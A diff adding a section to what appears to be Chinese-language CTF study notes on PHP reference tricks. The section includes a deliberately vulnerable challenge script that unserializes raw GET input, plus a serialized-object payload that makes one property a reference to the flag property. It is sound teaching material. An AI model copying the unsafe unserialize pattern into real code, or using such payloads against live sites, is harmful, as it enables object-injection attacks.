@@ -5196,6 +5196,48 @@ $args = GLOBALS
 $$args = $GLOBALS
 ```
 
+### PHP中引用的特性
+
+**提示：**PHP中引用的用法，将`$o->enter`设置为`$o->secret`的引用，这样更改`$o->secret`时`$o->enter`也会随之更改
+
+```php
+<?php
+#GOAL: get the secret;
+class just4fun {
+    var $enter;
+    var $secret;
+}
+if (isset($_GET['pass'])) {
+    $pass = $_GET['pass'];
+    if(get_magic_quotes_gpc()){
+        $pass=stripslashes($pass);
+    }
+    $o = unserialize($pass);
+    if ($o) {
+        $o->secret = "flag{I'm xxxxxxxxxxxxxxxxxxxxxxxxxxxx}";
+        if ($o->secret === $o->enter)
+         echo "Congratulation! Here is my secret: ".$o->secret;
+        else
+         echo "Oh no... You can't fool me";
+    }
+    else echo "are you trolling?";
+}
+?>
+```
+
+- `if(get_magic_quotes_gpc()){...}`：这是一个条件判断，用于检查 PHP 的 `magic_quotes_gpc` 配置是否开启。如果开启，那么 `get_magic_quotes_gpc()` 的值为 `true`，否则为 `false`。`magic_quotes_gpc` 是一个已经废弃的 PHP 配置选项，如果开启，那么所有的 `GET`、`POST` 和 `COOKIE` 数据都会自动进行转义，即在所有的单引号、双引号、反斜线和 `NULL` 字符前面自动添加反斜线。
+- `$pass=stripslashes($pass);`：如果 `magic_quotes_gpc` 配置开启，那么这行代码会移除 `$pass` 中的转义字符。`stripslashes()` 是一个 PHP 函数，用于移除字符串中的转义字符。
+
+```
+payload：
+
+$j = new just4fun();
+$j->enter = &$j->secret;
+echo urlencode(serialize($j));
+
+O%3A8%3A%22just4fun%22%3A2%3A%7Bs%3A6%3A%22secret%22%3BN%3Bs%3A5%3A%22enter%22%3BR%3A2%3B%
+```
+
 
 
 # Misc
